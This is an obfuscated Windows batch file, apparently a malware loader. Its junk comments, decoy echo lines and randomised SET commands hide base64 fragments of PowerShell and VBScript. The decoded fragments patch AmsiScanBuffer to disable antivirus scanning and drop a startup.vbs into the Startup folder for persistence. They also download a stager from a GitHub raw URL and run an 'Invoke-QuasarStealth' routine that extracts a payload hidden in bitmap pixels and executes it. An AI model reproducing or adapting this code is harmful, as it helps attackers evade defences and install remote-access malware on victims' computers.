@echo off
REM mirage cipher guard guard vision sword shadow echo
echo RXlZRkhyekpWU2xONVVKS2hsQmF6RjViWlFkZjJ0ZWFXN05zZFFmYg== >nul 2>&1
echo Sm5WUkFvWFd0NXltUzZaTGtkeXllSURtSHZ4TDZjZTcyMDJ4aEozVnJNWVJMRmdvaVhFc0wzaQ== >nul 2>&1
REM guard shadow phantom fathom phantom twilight phantom clearing
se%dCu%T "RRxbkgziLAAEWEC=RTuCrMlRvrZfmVkZTgiFoxRweZUT"
Se%QRQ%T "kpglmQACbZPBeDm=aIzUmuTUONKliippHpKgq"
echo Z2NOQ2RNZEFnVDRia3JBNHV2V0dTU0lQUkRHbnhxaWVtMjEwZWxuenB4M1E= >nul 2>&1
Se%SMb%t "efgyzcSQYF=ZGeclrIHTTdxrMFzsirUbz"
echo TzdYUk40ejJSTXNmRFhRSDM4WkhnZzREVzlzYnpsSnVWUjZvMzRySTl1NXlvV1RDaXZrb05o >nul 2>&1
Se%ahX%T "pk_TBVX_0000=JFNpbGVudCA9ICRmYWxzZQpmdW5jdGlvbiBMb2ctU2lsZW50IHsKcGFyYW0oW3N0cmluZ10kTWVzc2FnZSwgW3N0cmluZ10kQ29sb3IgPSAiV2hpdGUiLCBbYm9vbF0kSXNFcnJvciA9ICRmYWxzZSkKaWYgKC1ub3QgJFNpbGVudC"
REM kappa fragment fragment echo mirage kiln circle fragment ruby
REM kiln shadow lance
REM clearing cipher echo vertex fragment
REM sword mirage pixel binary beacon core kiln hawk circle
Se%TKKNw%t "TyhVGBvwJMtaRV=SAIKLWVEzggwnGjD"
REM lance valley kiln pixel vertex binary vision
sE%JyUI%T "PnmTEfGOzyRnw=ikrKQkSvTmuTvNrxHmKDTlugjOorvnvzRVo"
REM kiln valley phantom binary kiln
echo ZWl2VnJYQXl4bkFOOFF3a00wUmFaVFRFaTEwbjdLQWNBSHhFNlZTV09QU1A= >nul 2>&1
SE%tZuE%T "VzmwAEVUWyPiLnr=PvyzZLEBBte"
REM beacon guard odyssey vertex hawk kiln echo core
REM kiln kappa binary lance twilight pixel strobe twilight ruby
se%nmJ%T "zfjNdkJazJCmPD=VEirfpwshSl"
REM lance kappa odyssey delta kappa sword beacon fragment
REM vision cipher zenith clearing pixel mirage zenith binary sword kappa
se%qdMmg%T "DZcViVd=ietdwmMEsapnFGoEimuppEbVXOCFCHLg"
REM shadow circle circle
SE%UWtji%t "wQNlnseWYG=qzuBfUoPrHrzeOIuVdfaruQL"
echo YUpXWTZEZ2QxVWVvM21uQ0lxMXFwM1J3aUVrd1BiY3lPTjhqeHdzVGFSVTBGeHlzSEpkUUxwdWRLTjZnOEVOcjJaQ3NyelJwMjc= >nul 2>&1
Se%hKS%t "byEKZgVCxF=tXDmkUuVeBlPkujsBWL"
echo cHNQbnh5OWswaW1uVzI4UlhJRm55ZEYzS2VrNGJ0V0JSZDNWTGFKSA== >nul 2>&1
SE%FjZyc%T "mjEkluCaYQ=kUSVcVhOFC"
REM valley sword zenith ruby clearing delta zenith sword sword
REM core zenith kappa kiln
REM lance core delta phantom sword ruby core
echo S0N0OE1WNFRERW9IMWtveWxsODdyRXR5R0VqTldrR0NET01YQll3cHR2ZXlMYzlhRG1BbmM5cVdDTVdreWpBUGpxb2JHbFdM >nul 2>&1
SE%XCBPH%T "kfurVnxd=hhdvlESWsEr"
REM sword circle hawk binary ruby guard zenith binary cipher
se%lmAc%T "ENJgNIzQ=MfJGXABuGcXjSSqaUOQGLNzFrcp"
se%syp%t "qUzoRhhbamdtw=UuZaPwPdhFSipXPeWCFmRpzmeKjzY"
echo M2FpM3FnSW9zSzFBZHBpUnVkeEhpcmVocHMyVHQzZU5HUFlqSGE2UE5JUUEySm40dE9MazBsWU5QdnhET3dWc01qa0NlcXljWA== >nul 2>&1
se%XtGDv%t "uaRucfyH=efXZIqcLYZXXFAgRPFnzEAJu"
se%Wbv%t "WGLRonbfviO=OReFfDdleiModD"
REM sword glimmer delta undergrowth beacon core phantom circle mirage
echo S0VINERKT0ppSm9YWUFBeUQ3cnBiNkNJbXBveTFmblNDdXRqZTd4bXU3T2ZrS1YwN0VmeExVd2RWeE5S >nul 2>&1
REM echo kiln twilight valley
echo MEJOdkwySG1zZmFYcnE4N0d4eWpmbjI3SmUyNWhxbUNmOGlHZWZMOEpPMlkwdHF1RUZGeU45NDdlSzZKeXJPbFRtRWQ= >nul 2>&1
SE%HiF%T "ahOzXS=XiFJcAiUpwsVrubumU"
echo M295OW1IbXRRUThCZ3hpSm9za1A5VHBrd3pUWHljQ0hpd004MTcyRXRiRFJmbTk4N3QyYldXeWl5ZXlENFhRckZJRmJWeA== >nul 2>&1
REM hawk lance vertex kappa clearing beacon vision twilight beacon
sE%Nyw%t "QhLRmkPaFNhbcHk=iDFOorhxLIPlIzOJqRdCfXiOdY"
sE%ayG%t "oLrwcMSYVWziMy=HtnyenbAowHbwVOShCURGZRjL"
REM cipher circle fathom shadow undergrowth phantom clearing zenith
REM phantom odyssey mirage circle beacon echo fathom zenith
SE%BQhQi%t "DcRazdpKSoI=mnZTAsxIDiNrvnJqVKFBgIb"
echo OHFrV0lYM1h1MjdVTFRvbmFSRm9aNHRQOGhXQ0dxdEdZYW9pYWFaQUNKeUl3bDhVRHNTRHVGdm5yYkNTUFU= >nul 2>&1
REM kappa clearing twilight fathom circle
sE%dkoQ%t "SrwBsvlBmWCT=VkQTaNezgpVBmNAjYKfJ"
REM guard odyssey kiln
echo cjYyQ3p2M2JGRlhiWFk1UzU1Y2RBZ0Z5encyQzJmVVFMVmFveXVoaTE4RWxJekxwMA== >nul 2>&1
SE%EEM%t "KnVhoofVc=ROEwaUanrG"
Se%hCk%T "ybYpodav=fLyotwMHuzGGzgVqTZSivPbJu"
Se%JWHg%t "bjkIwUifdECdbNe=DrhlELrZgCjHACbQkkzJYHfgzKfKoW"
REM cipher ruby glimmer
echo dUY2S2p1cktOdDdScEY5d1VHZGk4MlVhUjZVSkNkTHBKYmIxQ2tPRUxjcjFzam5YMGhvd2RHMUt3TGs4bTVW >nul 2>&1
sE%hHIl%t "pPhLQmsYkTI=PufiDaeIEeurrjAAFPv"
REM odyssey ruby strobe clearing shadow ruby
REM fragment valley mirage phantom ruby fragment phantom strobe glimmer shadow
se%hxkmD%T "hgUJifRKaShSZPm=azraCffLHJFJLPMqzTNfVUiObKralPyl"
Se%LctD%t "OYhhlqPLKYKnS=eZpxQcRLwfdYRUjDvcBk"
echo WjlheE90RUd0VHB5dUF0NTJKWTMxb1J3NDlOZnNrUVdTU1BERUxQTjZPbFhrVmR1RXl0 >nul 2>&1
REM guard fathom hawk
sE%HdIt%T "tCuxhHwTGL=eFURPEVSirLUMIyGkLRgkA"
se%epigZ%t "hIScSRmYwLuacN=cEofWprDRTbojCWWuwTaqKDLgqK"
Se%zLTHY%T "kJFBOfU=dfxeFUsLjUbmSHTP"
REM hawk strobe pixel circle beacon kappa echo pixel beacon
REM circle cipher odyssey valley ruby
echo UTdXcUhxaFY5eUFDRXJGYmhPam9hSWF5em1zRUhsWWp0M21LSzl0dHE5NDVvZTNHamdzVDh0bm5RbUZiVnJLbGpH >nul 2>&1
echo V1BvSUd5eklhelZ1eFJpVERweHhHM1FzcWdUYnNqS25wa1NlT1RRTzQ3RTVqSk1La0ptRHBoekltSA== >nul 2>&1
se%RnhH%t "pk_TBVX_0011=mV0dXJuCn0KJHB0ciA9ICR0eXBlOjpHZXRQcm9jQWRkcmVzcygkaEFtc2ksICJBbXNpU2NhbkJ1ZmZlciIpCmlmICgkcHRyIC1lcSBbSW50UHRyXTo6WmVybykgeyByZXR1cm4gfQokcGF0Y2ggPSBbYnl0ZVtdXSgweEI4LCAwe"
SE%qAICc%t "XoBUGdXgGE=DRtVVjnjKbjmloCiHRPqeCNmKPpGtJhoR"
echo clIzMmNFOERsYlJWT3hyTzZQeGxLaWJxcmRBN3NDamdTOVM5NGhxdXZaVzZhVURneU5tU3lvSA== >nul 2>&1
REM sword hawk ruby
REM fathom echo binary beacon vertex
se%coToU%t "pk_TBVX_0020=BTZXQgZiA9IENyZWF0ZU9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKQp1ID0gIiIKRm9yIEVhY2ggYyBJbiBBcnJheSgkY2hyQXJyYXkpOiB1ID0gdSAmIENocihjKTogTmV4dApTZXQgaCA9IENyZWF0Z"
REM fathom odyssey clearing strobe lance vertex
echo dTRxTGJvaUR6aDdsSUlPVUNjSGtyb0ljOUpxUml5bFpENjhUcTJ4QzE2T2hCSVM2TW5QeTcwdkZNSUlJa1d4alFC >nul 2>&1
REM vertex hawk glimmer
SE%oamWJ%t "pk_TBVX_0008=dChJbnRQdHIgbHBBZGRyZXNzLCB1aW50IGR3U2l6ZSwgdWludCBmbE5ld1Byb3RlY3QsIG91dCB1aW50IGxwZmxPbGRQcm90ZWN0KTsKfQoiQApBZGQtVHlwZSAtVHlwZURlZmluaXRpb24gJGNvZGUgLUVycm9yQWN0aW9uIFNp"
REM mirage phantom ruby mirage
se%gPRFr%T "WrSMYmQre=JvYpOyczyTMci"
REM core phantom shadow
REM ruby mirage kappa circle core kappa binary vertex strobe
sE%WLx%t "FMzzNetkbwmMJ=gMTRnjfOFVKtMYmnCnVWkMhIa"
REM clearing binary circle
REM kiln odyssey undergrowth strobe ruby kappa
REM hawk cipher glimmer
REM twilight shadow sword
se%ioR%T "roEhwAin=ccbBUaUFtvpQItSjJ"
REM vertex echo cipher core phantom glimmer guard undergrowth
SE%sXCB%t "YwjKybQXRXYEru=ulUmOYmNGvXTuCYE"
se%AdEUz%t "pkCSGwr=nHnPXcasKnkmECkvuRWSYAxhWMa"
REM vision fragment vision pixel clearing clearing pixel echo circle clearing
REM vertex core glimmer core shadow clearing beacon pixel guard
se%dRxAx%T "jVDXRkdSDD=PuRzKCjxLrtUgZPJKpz"
REM valley zenith delta kiln hawk kappa delta shadow
REM clearing beacon lance odyssey
REM circle hawk vision zenith circle
echo STdPeVhuRWVkejBHaVF3eEg0YUwweWQ0cFRGQ0g3WkZYbFNJaWVWTUVPeGhONkV1VHlvOEg1NWtsUkRZbUZzejlITm11Q1BLZG1WMWc= >nul 2>&1
REM valley delta circle pixel zenith strobe strobe zenith circle
echo OWg4MzlvSnR3QWkwVmxCWTMycVlSQjJWNUZwOFFPcldRMU5lSXdncktZU3hFam5VRXlxcGQ= >nul 2>&1
sE%aUA%T "XsVbGkiqkUyQHe=ahwkJpFIqhIIUZYIZjbdtuXw"
echo NVZFVjlnT1B3aFpad0NzSm9mZG92emNndmJjTlJCRTRpOUtMSTByMlZsOHVHQmVuWFFQZEQ1VnFpZGdx >nul 2>&1
se%Hog%T "erxTjsE=BhJiPSaejkr"
sE%UlEf%T "OINCYc=wiMJjIBNVgpHUSfasZOZhVEtvrqlHUAIT"
REM kappa core zenith
REM pixel circle beacon echo strobe vertex mirage
echo SUlWNGdZQnNkZnBTWHB4RUdHZURZbTB1Rm1nZ3VSNk1Ha1RQNjJUWXFMMVZEdkIwcVpJRU1URkZMSk5wNTVDQlhjeng1MnB5Yw== >nul 2>&1
REM guard circle binary glimmer glimmer guard glimmer vertex kappa
REM kappa kiln fathom lance mirage
se%sBSyJ%t "iOALvNGebrZC=ZjloApFuWNenjcvYSrFePiUor"
sE%RPKdA%t "otcpXUrHVOMNYQ=WbOInYzSshJwvFzvujVGDHQhh"
echo M0tTV05wZUVUajQwczcyNmx5Q05DMjlxd1c3cnBveGZwSjd5ejc0S2xtVDh0RzJENWVTRm1SbGtKSWZ3bnhMN1JXUmhrV1NWcldp >nul 2>&1
sE%cbaC%t "YBAosz=xWtlpBgLtFPWFLdpxPrEaVxwSArdOUlXX"
REM lance twilight odyssey core valley fathom
REM valley kiln delta hawk binary twilight mirage twilight
REM valley glimmer valley fragment undergrowth zenith echo
REM mirage twilight undergrowth echo delta guard pixel
echo VHhZOVI2bjBTSU1STnhkT1Y1ZE16SWRaN25VckVpVHdtUEhKdjdodTlRdDI5SDdo >nul 2>&1
echo c0hsdHVUWjZ1TjhOMzk4M1VFdTlqODEzbWJjYW5ISVJQS3htMk45c2M0MThlUjREN0w2Q2hST2I2OEJ0REk2SkhkeVVSRXJ5 >nul 2>&1
echo NXFBWE9GdUdXdGpLNzBnanNUZFZRcUxLSEltcWtMZnVuYjJZdzVmYXlSc212WERLcjh6UmN0RFRWb3gzUw== >nul 2>&1
sE%QzU%t "AIUnZwaPlDWxb=kCfrlAcIANYAcFpkxu"
SE%KZOkK%T "ekikRN=OjLtwYmliBIQYF"
REM delta vertex fathom ruby twilight fragment circle phantom
SE%lnAXA%T "UvNxEw=xPKcYtobUKUbcdRgvcczzxIzcJdSOS"
echo NEpOMTc5Z1NMNUlobldTYjh0RVV2dklnVEZiVDdPblBYd3Y5VnZOYjFGbDE1aUNJS2JxOTRvaGlSdkE3cjlFdWF1ZmNlWkphNDI1RFdWYw== >nul 2>&1
echo Z0R6aU9jbElvYXpwRkFPZFpOc01ZdmJybVVLVUVYWjZzSTZrZlN4aWt2MnJocWlPbVdFcUlBektLeGRFZlpiaFl4dEhBdA== >nul 2>&1
REM core odyssey shadow fathom
REM zenith odyssey echo cipher echo lance binary zenith twilight
echo b3I3UTluejllUDdqV3dIREhnR2g3VWpjS01HV1dkbWgxTnJGaUpZYTVlbmEw >nul 2>&1
REM hawk odyssey shadow guard clearing beacon guard cipher
SE%hDJMS%T "oxopwruaO=mYqzXBoKztWyPIpTcXBdpzjZgNVYp"
SE%pDXg%T "LcZVyHlDLfTULNV=fIRYlIWMvqueBVfhtqdeZ"
SE%BeTg%T "rzIPwcQbqZ=BzpxqpcEsDKJTNTxqM"
se%eqzBl%t "fIOTKLTfQ=tQstkRLJxFkGZmUmIooVlgcDQHboM"
echo RFVpWFdINGQ5ZlUwSWZOYjEwN3pNRUZKY1JtNW91VllnVG5QemdZelVndlI1d24wSlMwbEFEQjdsY0UxbTFJMHFW >nul 2>&1
REM strobe fragment shadow hawk fragment echo strobe echo odyssey
echo UXlRQWNRdGRGNlJxMkR5bWlhQ0Y5eHdrVnBWVlNSWk16WHhaTU9TQlZrdGpRWmJ4RTJOWXFiUWVrYUhXNGkzMDloamN2 >nul 2>&1
echo clVmRjVEeTZCUTg2SkdISkFrdGhsYmE2dml0a0hZNkczdXpSa0NuWE1uOUpicFpZMll6 >nul 2>&1
REM fragment cipher core fathom lance
echo eTA4VTk3eFhTS2VXTGhRMndJNXBXSEFKdEpaOXRlMjVtZGRaVm1iaVNiOEdKNWduMTg= >nul 2>&1
sE%wYxE%t "fIkznDCt=rqTDVbmlNNgKlQOz"
sE%UDU%t "otdmzmJVQv=mQFHNiPSAGNrZ"
REM fragment kappa hawk valley twilight echo sword strobe kiln
echo MFVJUzNYdE9QUW5uUkVFUnd4SnpIcVRWU2hEQVhoSlNCc0xGN3o1bE9wUlp5Rm1OWlVyNDdKQk96cDc1ZzlmUEtsVE1wS0xsSzdqV296bg== >nul 2>&1
REM clearing kiln shadow undergrowth kiln clearing kappa glimmer echo
echo a21HbXhQVXpSbmxhdzhsMEFYV0tiY2doWWNmdmJVc2RQYTlZUEJib0FI >nul 2>&1
REM phantom odyssey valley binary beacon sword twilight hawk beacon vision
Se%xIRA%t "LDNePuBAZ=fcUjTOJgioNBPI"
REM delta vision valley fathom twilight fathom delta strobe core vertex
REM mirage valley lance phantom
echo Wkd0WFJ6WWlyTjl0S1loZWx2R1E0QlZPbUdYSFNlV3U2NnVZeFpkTTd6WlBmb3UxclZpNVFBNThFNUFh >nul 2>&1
Se%aJu%t "ttXEwmFLiVSR=gxhBRaaYZKmlaDqJKcRHJ"
se%iYdT%t "ZCDhrlHvbeKFa=StzujCMwOEtFZqqEenZLiixYYvpwwReNmf"
echo RWR4RkN1OVB0MTJJdEVJZ3ZoZ2s5dzhJZzNLM21nbjlqYm1ZVU9YRjR3eGZkWW8zQU9MSXQxMWxzRnJlaEpUT1ZReENrcXFSV0t4TUpLSA== >nul 2>&1
echo dmZPVVhtTVVoVHhMU3oxdjk3M2hhNHFDb1JYWE1OSjZRdks0SlRVTkNPczZrZm4zbDZJa2RuTEhIa1pYcjBGN0ZUWg== >nul 2>&1
SE%nnkwC%t "dKxHZUWbaVF=gCSiSvjGTxETuxvlTibeth"
SE%lotT%T "pk_TBVX_0030=W42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYiKQokZGF0YSA9ICR3Yy5Eb3dubG9hZERhdGEoJFNvdXJjZSkKJHdjLkRpc3Bvc2UoKQp9IGVsc2VpZiAoVGVzdC1QYXRoICRTb3VyY2UpIHsKJGRhd"
se%dkqV%T "kRYNVLGK=vbWYnMsfZInvVBFKTWachUnNFEnFrMvvmi"
SE%nLmyD%T "CSRVoywcVky=zSVBLdXTiFELSYZUAiLp"
echo akU3bDhacUVSdUFPMnZIUzdPOVFBdmR3cENsRzR6OGhLemtZUU5mT3hNTXZRa1NScXBrSWRWUHlqRExMaVJnVDdLUw== >nul 2>&1
se%wOAXV%t "oZeKHRGiLUH=BpSPtENjbabNNnDZZkBfoJQFBAJeDEAIrT"
se%glqFy%t "GqdQmpYhpgzvGe=UFONhnRhGQyyaziplPPnwyZ"
REM strobe cipher vision glimmer sword hawk odyssey circle valley clearing
REM vision lance delta binary circle pixel
sE%mnu%t "pk_TBVX_0047=ZW50cnkuSW52b2tlKCRudWxsLCBAKCxbc3RyaW5nW11dQCgpKSkgfQp9Cn0gY2F0Y2ggewpMb2ctU2lsZW50ICJMb2FkZXIgRXJyb3I6ICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIiAiV2hpdGUiICR0cnVlCn0KfQpJ"
REM beacon pixel kappa
REM hawk cipher echo strobe beacon circle
REM ruby undergrowth zenith beacon kappa
se%JiFck%T "QZPvRV=VARphsieSBjqDEgeadi"
echo WEpFSnU1MFlXSXNOY1RDQWJtN3hNMmFnQTNVSnF1SU4welhCdTZzRw== >nul 2>&1
REM kiln circle ruby zenith fathom kappa fathom fathom delta lance
Se%dUwCJ%T "XtYUXLnQxCmDlx=iAkMtiOXxrQqPxNQHdnLunzCZEUuR"
SE%fJLis%T "ydhndlzlaTaiB=DtWkrHeeEvLxeOG"
sE%ncU%T "puqcgqDQbfRx=oQeTyHkrsSOS"
SE%qpJoQ%t "zMfHEx=CZOmdBnEETdd"
REM echo echo undergrowth guard
echo WkJxc01KM3RvS2c4T0xWejQ3dFlKYWJpRHhrMDNlOEpDV0ZZcnFLTmhyUjhMeEdMTld2Q2lNcTFvOVpyRXZrWkU1emdKd1ljQWc4dw== >nul 2>&1
echo cEY5cmw1TVBKMWRDN2JDekJIT05ISmZpcEhIczVvaDA1dzJnRWlBU2VqZWNhWUJ2eUhmWTlydUV0QWlxeDlrNlRZbQ== >nul 2>&1
REM guard strobe ruby cipher valley clearing fathom
se%MSY%t "TDwXuS=nOwoUpnXTnHGEYUixayV"
Se%pYjk%T "SfhMNzQamVxtXC=eMHswYTDStjLsfQFa"
REM odyssey twilight undergrowth mirage ruby undergrowth odyssey phantom ruby phantom
Se%IUm%T "XvjdtQYT=VpteBrByZjKdMR"
echo bjF0b0lWZVFrRUdoVklLSnF1YVlKaXBBbzdDZEViT3RnRE5aS0JFUExyaDV6VGlCT1BCTFBHNUdiTnV0VzJTSXoxUDJjMkJZYmVRVWk3cA== >nul 2>&1
REM sword glimmer valley mirage twilight strobe circle
Se%MKNo%t "qACXOVFChlos=olDZmBKEXeTeIUjFCNvjlIALrW"
REM core cipher mirage phantom cipher circle delta
REM guard cipher twilight lance kiln phantom
sE%lCCg%t "NtawkHcYd=bpXVjJqvvlseb"
se%iJQ%T "AbRoLYwwXVSMO=nbqPbANugYEgZXEfiftQdBJxpetSUGpxS"
echo TEpHN0RETHhiRmhTbmM4NWRkSjNTOTFtUjc1WEV1YjBIeVhrcVNFMncx >nul 2>&1
REM glimmer lance lance
REM twilight cipher strobe kiln
REM binary glimmer vertex binary ruby delta beacon
SE%VQG%T "wZljDt=dZlWgrnTnObnZnXkhWsKawVEvzDKp"
REM kappa lance binary pixel delta hawk phantom echo twilight zenith
Se%TmAdw%t "innonGnXeFd=aLpNdzQaVCrOVlNiQpYVpRPNPQRM"
REM ruby beacon mirage guard vision guard kappa
echo cXZNTTdTS01tUjNhWUNIelhXRldXdGsyck04VGN0cVdZWGF6RE9BOGp3 >nul 2>&1
sE%wvBxI%t "tLHdKsDBytmJDW=gHqxsBdCHwiobuabsQZSnGLcUIxbRVASM"
REM mirage kappa vertex phantom undergrowth vision echo glimmer
Se%APy%t "sDZbpXHDLPJONV=YxrvnLeozNqljYVJAvELrbrouVI"
SE%pzjGn%t "pk_TBVX_0038=WdlICRsZW5ndGgpIHsgJGRvbmUgPSAkdHJ1ZTsgYnJlYWsgfQp9CmlmICgkZG9uZSkgeyBicmVhayB9Cn0KJHBhY2tlZCA9ICRleHRyYWN0ZWQuVG9BcnJheSgpOyAkYm1wLkRpc3Bvc2UoKTsgJG1zLkRpc3Bvc2UoKQpMb2ct"
REM undergrowth ruby cipher kappa undergrowth
SE%ovc%T "DGwbFdPOwJxDRK=vHmvsnMXpQxJYBFgAvblKM"
echo VTRXUVBIOTVUWllrdnZGTXJnV2lBVFg5OWF2bDM2Snd6cDJVeW5uU3k3cDhzZkgxbkxEZUxlUE11ZzBZeEJ3WmxyZGtDelVhQXo= >nul 2>&1
Se%zOg%T "pk_TBVX_0022=m1lbnRTdHJpbmdzKCIlVEVNUCVcdXNlci5iYXQiKQpXaXRoIENyZWF0ZU9iamVjdCgiQURPREIuU3RyZWFtIik6IC5UeXBlID0gMjogLkNoYXJzZXQgPSAidXRmLTgiOiAuT3BlbjogLldyaXRlVGV4dCBoLnJlc3BvbnNlVGV"
REM shadow beacon shadow lance sword valley phantom
REM echo shadow zenith echo shadow guard
REM shadow circle echo mirage
sE%jgnAL%T "YuyGgESDNMGBoC=jwhxOVlZOXMJowEQpy"
REM odyssey kiln echo fathom valley kappa lance zenith undergrowth vertex
se%Lug%t "OiHcYiN=ySuBHEQhFpoTNWEklgNYSowijwDxeE"
Se%tZP%T "pk_TBVX_0018=0gW1N5c3RlbS5JTy5QYXRoXTo6Q29tYmluZSgkc3RhcnR1cEZvbGRlciwgInN0YXJ0dXAudmJzIikKaWYgKFRlc3QtUGF0aCAkdmJzUGF0aCkgeyByZXR1cm4gfQokY2hyQXJyYXkgPSAoJFN0YWdlclVybC5Ub0NoYXJBc"
SE%PchH%T "RahduFsPwRqm=kasWkAbyqhKqJDnmU"
sE%ZYBtv%T "jRpnqtvjBlng=PXEEVDDFpdlQejkorVBrOoakARJQGNHVUDO"
REM ruby vision hawk hawk
REM clearing phantom phantom odyssey
REM vertex ruby lance vision delta echo delta glimmer
sE%Nmuyb%t "oGxvlD=ZTHmTwwIJLmRKatUwCwaPPbQ"
REM fragment undergrowth kappa cipher undergrowth zenith binary lance
SE%Bbb%T "DZQtOFmIVY=MQopWnebxkgxF"
REM phantom strobe lance strobe kappa echo guard
se%cfE%T "fDdBnNJuqQchRh=cVNRIVIQeibNK"
REM vision guard zenith kappa
sE%qXmcu%t "pk_TBVX_0007=F0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIHByb2NOYW1lKTsKW0RsbEltcG9ydCgia2VybmVsMzIiKV0gcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBWaXJ0dWFsUHJvdGVj"
SE%LryA%T "pk_TBVX_0024=kdmJzUGF0aCAtRW5jb2RpbmcgYXNjaWkgfSBjYXRjaCB7fQp9CiRQRVJTSVNURU5DRV9VUkwgPSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3doYXRldmFib3kvY3VybHljYXJuaXZhbC9tYWl"
REM vertex hawk beacon valley delta delta guard twilight phantom
REM valley beacon ruby phantom valley lance sword ruby
REM guard valley pixel twilight valley ruby sword
Se%pabUU%t "pk_TBVX_0025=uL3VzZXIudHh0IgppZiAoJFBFUlNJU1RFTkNFX1VSTCAtYW5kICRQRVJTSVNURU5DRV9VUkwgLW5vdG1hdGNoICJSRVBMQUNFIikgewpJbnN0YWxsLVBlcnNpc3RlbmNlIC1TdGFnZXJVcmwgJFBFUlNJU1RFTkNFX1VSTAp9CkFkZC1U"
REM lance undergrowth beacon clearing zenith valley glimmer twilight
Se%GQD%T "pk_TBVX_0028=kKZnVuY3Rpb24gSW52b2tlLVF1YXNhclN0ZWFsdGggewpwYXJhbSAoW3N0cmluZ10kU291cmNlKQp0cnkgewokZGF0YSA9ICRudWxsCmlmICgkU291cmNlIC1saWtlICJodHRwKiIpIHsKTG9nLVNpbGVudCAiWypdIER"
sE%Zmrh%T "fkBTtXdEFWxN=wmbUPzlsQycsJwAFxjyCcqwIUesssMz"
echo U04yQUxCTXVtREZscFJjQ0REOTdDNzJCQlI2T1JXTjdvVUhVSGRpV1o5MGs2VTNQdzNyVHdlU3I5NUxBVkpJc0VlVlRm >nul 2>&1
REM binary clearing zenith
echo bGVTc0NvYjlqRkM1T2JYMXU3aVloaVJDMFlWUUNDY0h5eTJyQXFFbzdZU0tPZG16b1Vqamh4aw== >nul 2>&1
echo a20wSFdmdDN0M2ZNRlduWjcwQ0ppcHMzb05PdExGcnJsVVVKTTVOZWU0R2dRR29vcFY5YU5majFlQ1psb0FXbw== >nul 2>&1
REM binary clearing cipher guard mirage zenith mirage fathom pixel
sE%OPTc%T "pk_TBVX_0037=JHB4LkcpOyBpZiAoJGV4dHJhY3RlZC5Db3VudCAtZ2UgJGxlbmd0aCkgeyAkZG9uZSA9ICR0cnVlOyBicmVhayB9CiRleHRyYWN0ZWQuQWRkKCRweC5CKTsgaWYgKCRleHRyYWN0ZWQuQ291bnQgL"
REM guard clearing ruby vision vertex sword undergrowth valley hawk guard
sE%qrvOc%t "MKwMEs=IdjTsoBxySzQAoeoWkCawGwLFiFbYrdny"
REM clearing valley echo echo fragment glimmer kappa beacon vertex shadow
echo NFk3UDNIMWphVGJhZk5zSFlNWUNQZnk0RFRFdDY2ZUExcXZIbThLRmowc3l1bFZhR1pueUNQRUtrSFM= >nul 2>&1
REM mirage glimmer core hawk
REM delta delta fathom hawk ruby glimmer undergrowth
echo bWQ4STJmSG5MWnFLQmJUYlYyNGVndFJoYlFhZkw4MVN4ZU5FRlJ5eXJXMEFkWmpOZVNSU3VnYTFJOTI5QlA4NzFaN00zNg== >nul 2>&1
REM lance phantom glimmer fathom core guard phantom
se%kkw%t "yNtkur=tMfvsDskXpJZRwhazopzgYtJzTqrCOXVNx"
REM hawk twilight valley undergrowth
se%MGZTM%T "kHydhS=CANpzdWjWqVSttOxovLVOZBXOKTBmBDPqTN"
se%HXoEy%T "pk_TBVX_0012=DU3LCAweDAwLCAweDA3LCAweDgwLCAweEMzKQokb2xkID0gMAppZiAoJHR5cGU6OlZpcnR1YWxQcm90ZWN0KCRwdHIsICRwYXRjaC5MZW5ndGgsIDB4NDAsIFtyZWZdJG9sZCkpIHsKW1J1bnRpbWUuSW50ZXJ"
REM phantom mirage lance odyssey vertex lance hawk cipher strobe twilight
Se%Mmi%t "ZPPSEtHVEK=HtBJgfrLNml"
sE%lsYh%T "HmkclKlKtb=sRHQNXXQwYKZPsUsybGGlSiQewCIPX"
echo OUpCb1hnZ3UxcFZvaHN6Y3BGa09QU1ZHQkhFMm9jV1B6UnlBSnd2eVl3ZnVhVUYzYkVkQkFUbzRYQmVITTBLUnBYUnVtYXlJcGxQT3k5 >nul 2>&1
se%BDDot%t "kOvKiPhxE=XtxZrSUUJOgnKaXzRBjdpZG"
